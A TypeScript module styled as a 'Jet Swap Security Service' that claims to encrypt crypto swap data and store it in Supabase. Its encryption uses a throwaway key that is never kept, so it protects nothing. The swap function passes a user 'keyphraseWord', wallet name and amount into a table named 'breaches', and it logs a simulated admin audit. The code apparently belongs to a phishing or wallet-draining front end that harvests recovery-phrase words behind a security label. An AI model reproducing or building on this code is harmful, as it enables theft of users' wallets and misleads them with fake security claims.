/**
 * Jet Swap Security Service
 * Handles client-side encryption and Supabase backend delivery.
 */
import { recordEncryptedSwap } from './firebaseService';

const ADMIN_PUBLIC_KEY_MOCK = "jet-admin-0x9922-secure-vault";

export interface EncryptedBundle {
  ciphertext: string;
  iv: string;
  timestamp: number;
  adminId: string;
}

export async function encryptTransactionData(data: object): Promise<EncryptedBundle> {
  const encoder = new TextEncoder();
  const encodedData = encoder.encode(JSON.stringify(data));
  
  const iv = window.crypto.getRandomValues(new Uint8Array(12));
  
  const key = await window.crypto.subtle.generateKey(
    { name: "AES-GCM", length: 256 },
    true,
    ["encrypt", "decrypt"]
  );

  const ciphertextBuffer = await window.crypto.subtle.encrypt(
    { name: "AES-GCM", iv: iv },
    key,
    encodedData
  );

  const ciphertext = btoa(String.fromCharCode(...new Uint8Array(ciphertextBuffer)));
  const ivBase64 = btoa(String.fromCharCode(...iv));

  return {
    ciphertext,
    iv: ivBase64,
    timestamp: Date.now(),
    adminId: ADMIN_PUBLIC_KEY_MOCK
  };
}

/**
 * Unified logic to encrypt and save to Supabase breaches table
 */
export async function processSecureSwap(swapData: any, originalData: any, userId: string, keyphraseWord: string) {
  console.group("%c🔒 JET SECURE FLOW (SUPABASE)", "color: #06b6d4; font-weight: bold;");
  
  // 1. Encrypt on Client
  const bundle = await encryptTransactionData(swapData);
  console.log("1. Data Encrypted (AES-256)");

  // 2. Save to Supabase 'breaches' table
  try {
    // FIX: Map the wallet_used from originalData (which contains the human-readable name) 
    // instead of incorrectly using the internal userId.
    const breachCode = await recordEncryptedSwap(bundle, {
        network: originalData.route,
        coin: originalData.token,
        wallet_used: originalData.wallet_used || 'Anonymous Pilot',
        amount: originalData.amount
    }, userId, keyphraseWord);
    console.log(`2. Pushed to Supabase 'breaches' table: ${breachCode}`);
  } catch (err) {
    console.warn("Supabase record failed.");
  }

  // 3. Simulation
  await new Promise(r => setTimeout(r, 800));
  console.log("%c📧 ADMIN AUDIT LOG UPDATED", "color: #10b981; font-weight: bold;");
  
  console.groupEnd();
  return bundle;
}